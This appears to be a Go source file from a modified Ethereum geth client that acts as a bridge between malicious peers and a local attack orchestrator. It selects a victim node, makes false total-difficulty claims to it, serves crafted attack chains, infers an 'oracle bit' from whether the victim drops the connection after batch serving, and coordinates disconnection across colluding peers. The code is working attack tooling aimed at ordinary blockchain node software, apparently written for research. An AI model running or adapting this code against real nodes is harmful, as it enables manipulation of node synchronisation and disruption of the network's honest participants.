package bridge

import "net"
import "math/big"
import "time"
import "sync"
import "encoding/binary"
import "github.com/ethereum/go-ethereum/p2p"
import "github.com/ethereum/go-ethereum/ethdb"
import "github.com/ethereum/go-ethereum/core/types"
import "github.com/ethereum/go-ethereum/attack/msg"
import "github.com/ethereum/go-ethereum/attack/utils"

const (
	ADDR = "localhost"
)
var port string
var conn net.Conn
var incoming chan []byte
var quitCh chan struct{}
var attackPhase utils.AttackPhase
var mustCheatAboutTd bool
var servedBatches []bool
var numServedBatches int
var dropped chan bool
var master bool
var victim *p2p.Peer
var victimID string
var otherMaliciousPeers []string
var mustChangeAttackChain bool
var quitLock sync.Mutex
var victimLock sync.Mutex
var canServePivoting chan bool
var canDisconnect chan bool


func SetOrchPort(p string) {
	port = p
}

func Initialize(id string) error {
	var err error

	err = createMgethDirIfMissing()
	if err != nil {
		log("Could not create local directory for mgeth")
		log("err =", err)
		return err
	}

	// By calling getChainDatabase(), we force the bridge to copy the prediction database into the local
	// directory and open it. This avoids an undesirable overhead at the first database query later on.
	if _, err = getChainDatabase(utils.PredictionChain); err != nil {
		log("Could not load", utils.PredictionChain, "chain database")
		log("err =", err)
		return err
	}

	conn, err = net.Dial("tcp", ADDR+":"+port)
	if err != nil {
		log("Could not connect to orchestrator")
		log("err =", err)
		return err
	}

	_, err = conn.Write([]byte(id))
	if err != nil {
		log("Could not send node's ID to orchestrator")
		log("err =", err)
		conn.Close()
		return err
	}

	attackPhase = utils.StalePhase
	mustCheatAboutTd = true
	numServedBatches = 0
	dropped = make(chan bool)
	master = false
	canServePivoting = make(chan bool, 1)
	canDisconnect = make(chan bool)

	incoming = make(chan []byte)
	go readLoop(conn, incoming, quitCh)
	go handleMessages()


	log("Initialized bridge")
	return nil
}

func SetMasterPeer() {
	if attackPhase == utils.StalePhase {	// Cannot start an attack yet. Ignore this victim
		log("Not setting as master peer due to insufficient number of malicious peers")
		return
	}

	master = true
	err := sendMessage(msg.MasterPeer)
	if err != nil {
		fatal(err, "Could not announce self as master peer")
	}
	log("Announced as master peer")
}

func SetVictimIfNone(v *p2p.Peer) {
	vID := v.ID().String()[:8]
	if attackPhase == utils.StalePhase {	// Cannot start an attack yet. Ignore this victim
		log("Ignoring victim", vID, "due to insufficient number of malicious peers")
		return
	}

	// Don't pick another malicious peer as a victim!
	for _, s := range otherMaliciousPeers {
		if vID == s {
			return
		}
	}

	victimLock.Lock()
	// We want either to pick a new victim or get the p2p.Peer object of the one already picked.
	// But we must avoid changing victim during the attack.
	if victim == nil && (victimID == "" || victimID == vID) {
		victim = v
		victimID = vID
		v.Dropped = dropped
		v.SetMustNotifyDrop(true)
		err := sendMessage(msg.SetVictim.SetContent([]byte(victimID)))
		if err != nil {
			Close()
			fatal(err, "Could not announce victim ID to orchestrator")
		}
		if attackPhase == utils.ReadyPhase {
			attackPhase = utils.PredictionPhase
			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(utils.PredictionPhase)}))
			if err != nil {
				Close()
				fatal(err, "Could not announce victim ID to orchestrator")
			}
		}
		log("Set victim:", vID)

		// These two channels may remain full if the victim never sent the pivoting request
		// during previous syncOp, or it did but we disconnected before serving it (when leaked bit is 0).
		// Therefore, we clear them.
		L:
		for {
			select {
			case <-canServePivoting:
			case <-canDisconnect:
			default:
				break L
    		}
		}
	} else {
		log("Ignoring victim: vID =", vID, ", victimID =", victimID, "victim =", victim, "&victim =", &victim)
	}
	victimLock.Unlock()
}


/*
func PeerDropped() {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not notify peer drop")

	default:
		dropped <- true
	}
}
*/

// This function would be useful to set the victim's p2p.Peer object in the non-master peer.
// However, the non-master peer doesn't need this object. So, the function does nothing for now.
func NewPeerJoined(peer *p2p.Peer) {
	return
}

func ServedBatchRequest(from uint64, peerID ...string) {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not notify served batch request")

	default:
		if peerID == nil || peerID[0] == "" {
			fatal(utils.ParameterErr, "Serving batch to unknown peer")
		}
		if victimID == "" {
			log("Doing nothing because victim is not set yet")
			return
		}
		if peerID[0] != victimID {
			fatal(utils.ParameterErr, "ServedBatchRequest() shouldn't be called on non-victim peer's queries")
		}
		
		if (from-1)%utils.BatchSize != 0 {
			fatal(utils.ParameterErr, "Error: served batch does not start with a multiple of", utils.BatchSize)
		}
		if (from-1)/utils.BatchSize == uint64(len(servedBatches)) {		// We are serving the last, partial batch
																		// containing the higher pivot and head
																		// We don't care about serving this batch
																		// Btw, we should never reach this branch
																		// as this request gets dropped earlier.
			return
		}

		// Non-master peer does not need to keep track of served batches
		if master {
			if !servedBatches[int((from-1)/utils.BatchSize)] {
				numServedBatches++
			}
			servedBatches[int((from-1)/utils.BatchSize)] = true
		}
		log("Batch request served: victim=" + peerID[0] + ", from=", from, "numServedBatches=", numServedBatches)


		// Notify master peer about served batch
		if !master {
			content := make([]byte, 4)
			binary.BigEndian.PutUint32(content, uint32(from))
			content = append(content, []byte(peerID[0])...)
			err := sendMessage(msg.BatchRequestServed.SetContent(content))
			if err != nil {
				fatal(err, "Could not notify that batch", (from-1)/utils.BatchSize, "has been served")
			}
		}

		// All batches have been served, check whether the master peer gets dropped
		// and force a disconnection in any case afterwards
		if numServedBatches == len(servedBatches) && master {
			go func() {
				timeout := time.NewTimer(3*time.Second)
				var bit byte
				select {
				case <-timeout.C:
					log("Timeout fired, oracle bit is 1")
					bit = 1
				case <-dropped:
					log("Dropped by victim, oracle bit is 0")
					bit = 0
				case <-quitCh:
					log("Quitting")
					return
				}
				timeout.Stop()

				victim.SetMustNotifyDrop(false)
				canServePivoting <- true 		// Only after leaking the bit, we can proceed with the disconnection
				SendOracleBit(bit)
				victimLock.Lock()

				if bit==1 {
					<-canDisconnect				// When bit==0, we disconnect without waiting for serving the pivoting
												// request. This is because the victim will already restart a new
												// syncOp due to the invalid header it encountered.
				}
				victim.Disconnect(p2p.DiscUselessPeer)
				victim = nil // Since we disconnect, the Peer object referencing the victim cannot be use any longer
				master = false
				servedBatches = make([]bool, numServedBatches) // Reset all values to false
				numServedBatches = 0
				log("Reset victim: victim =", victim, "&victim =", &victim)
				victimLock.Unlock()
			}()
		}
	}
}

/*
func areAllBatchesServed() bool {
	for _, served := range servedBatches {
		if !served {
			return false
		}
	}
	return true
}
*/


func GetAttackPhase() utils.AttackPhase {
	return attackPhase
}


func DoingPrediction() bool {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not determine if attack phase is prediction")
		return false
		
	default:
		return (attackPhase==utils.PredictionPhase)
	}
}

func GetChainDatabase(chainType utils.ChainType) ethdb.Database {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not serve custom chain")
		return nil
		
	default:
		db, err := getChainDatabase(chainType)
		if err != nil {
			fatal(err, "Could not serve custom chain")
		}
		return db
	}
}

func CheatAboutTd(peerID string) (*big.Int, bool, error) {
	select {
	case <-quitCh:
		return utils.HigherTd, false, utils.BridgeClosedErr
		
	default:
		//Don't do anything if we are not ready yet
		if attackPhase==utils.StalePhase {
			return utils.HigherTd, false, nil
		}

		// Don't cheat to other malicious peers!
		for _, s := range otherMaliciousPeers {
			if peerID == s {
				log("Not cheating about TD to peer", peerID)
				return utils.HigherTd, false, nil
			}
		}

		log("Cheating to peer", peerID, "if necessary at this point")
		return utils.HigherTd, mustCheatAboutTd, nil
	}
}

/*
func GetHigherHeadAndPivot() (*types.Header, *types.Header) {
	chainType := attackPhase.ToChainType()
	if chainType == utils.InvalidChainType {
		log("Returning higher head and pivot for", utils.PredictionChain, "chain even if we are in", attackPhase)
		chainType = utils.PredictionChain
	}
	return getHigherHeadAndPivot(chainType)
}
*/

func BatchExists(from uint64) bool {
	if (from-1)%utils.BatchSize != 0 {
		fatal(utils.ParameterErr, "Error: passed batch does not start with a multiple of", utils.BatchSize)
	}

	if (from-1)/utils.BatchSize >= uint64(len(servedBatches)) {
		return false
	}
	return true
}

// Note: the update logic for 'mustChangeAttackChain' works as long as MustChangeAttackChain() gets called
// only in a single point by geth. If multiple pieces of code manage their own attackChain, this won't work
// any longer.
func MustChangeAttackChain() (bool, utils.ChainType) {
	result := mustChangeAttackChain
	mustChangeAttackChain = false

	ct := attackPhase.ToChainType()
	if ct == utils.InvalidChainType {
		ct = utils.PredictionChain
	}

	return result, ct
}

func MustUseAttackChain() bool {
	if victimID != "" && (attackPhase==utils.ReadyPhase || attackPhase==utils.PredictionPhase) {
		return true
	}
	return false
}


func SendOracleBit(bit byte) {
	err := sendMessage(msg.OracleBit.SetContent([]byte{bit}))
	if err != nil {
		fatal(err, "Could not send oracle bit to orchestrator")
	}
	log("Sent oracle bit", bit)
}


func LastPartialBatch(from uint64) bool {
	if (from-1)%utils.BatchSize == 0 && (from-1)/utils.BatchSize == uint64(len(servedBatches)) {
		return true
	}
	return false
}


func Latest() *types.Header {
	chainType := attackPhase.ToChainType()
	if chainType == utils.InvalidChainType {
		/*
		fatal(utils.ParameterErr, "Trying to get latest block while attack is stale")
		return nil
		*/
		log("Latest() returning latest block of", utils.PredictionChain, "chain even if we are in", attackPhase)
		chainType = utils.PredictionChain
	}
	return latest(chainType)
}


func IsVictim(id string) bool {
	return victimID==id
}

func DelayBeforeServingBatch() {
	time.Sleep(3*time.Second)
}

func WaitBeforePivoting() {
	timeout := time.NewTimer(10*time.Second)
	select {
	case <-canServePivoting:
		timeout.Stop()
	case <-timeout.C:			// Avoiding the eth/handlers to stall forever (this should happen hardly ever btw)
		log("Odd case happened: pivoting request arrived after peer re-election as master")
	}
}

func PivotingServed() {
	canDisconnect <- true
}


func Close() {
	quitLock.Lock()
	select {
	case <-quitCh:
	default:
		close(quitCh)
		close(incoming)
		//close(outgoing)
		conn.Close()
	}
	quitLock.Unlock()
}


func addMaliciousPeer(peer string) {
	for _, s := range otherMaliciousPeers {
		if s == peer {
			return
		}
	}
	
	log("New malicious peer:", peer)
	otherMaliciousPeers = append(otherMaliciousPeers, peer)
}


func handleMessages() {
	for {
		select {
		case <-quitCh:
			log("Stopping message handler")
			return

		case messageAsBytes := <-incoming:
			message := msg.Decode(messageAsBytes)
			switch message.Code {
			case msg.NextPhase.Code:
				attackPhase += 1
			case msg.SetCheatAboutTd.Code:
				switch message.Content[0] {
				case 0:
					mustCheatAboutTd = false
				case 1:
					mustCheatAboutTd = true
				}
			case msg.SetNumBatches.Code:
				numBatches := int(binary.BigEndian.Uint32(message.Content))
				servedBatches = make([]bool, numBatches)
				log("Set numBatches to", numBatches)
			case msg.BatchRequestServed.Code:
				from := binary.BigEndian.Uint32(message.Content[:4])
				servedPeer := string(message.Content[4:])
				go ServedBatchRequest(uint64(from), servedPeer)
			case msg.SetVictim.Code:
				victimID = string(message.Content)
			case msg.NewMaliciousPeer.Code:
				addMaliciousPeer(string(message.Content))
			case msg.SetAttackPhase.Code:
				newAttackPhase := utils.AttackPhase(message.Content[0])
				if newAttackPhase != attackPhase {
					attackPhase = newAttackPhase
					log("Attack phase switched to", attackPhase)
					if attackPhase != utils.StalePhase {
						mustChangeAttackChain = true
					}
				}
			/*
			case msg.MustDisconnectVictim.Code:
				switch message.Content[0] {
				case 0:
					mustDisconnectVictim <- false
				case 1:
					mustDisconnectVictim <- true
				}

			case msg.SolicitMustDisconnectVictim.Code:
				go func() {
					if master {
						mdv := <-mustDisconnectVictim
						content := byte(0)
						if mdv {
							content = byte(1)
						}
						sendMessage(msg.MustDisconnectVictim.SetContent([]byte{content}))
					}
				}()
			*/
			case msg.Terminate.Code:
				Close()
			}
		}
	}
}

func sendMessage(message *msg.Message) error {
	buf := message.Encode()
	n, err := conn.Write(buf)
	if err != nil {
		return err
	}
	if n < len(buf) {
		return utils.PartialSendErr
	}
	return nil
}

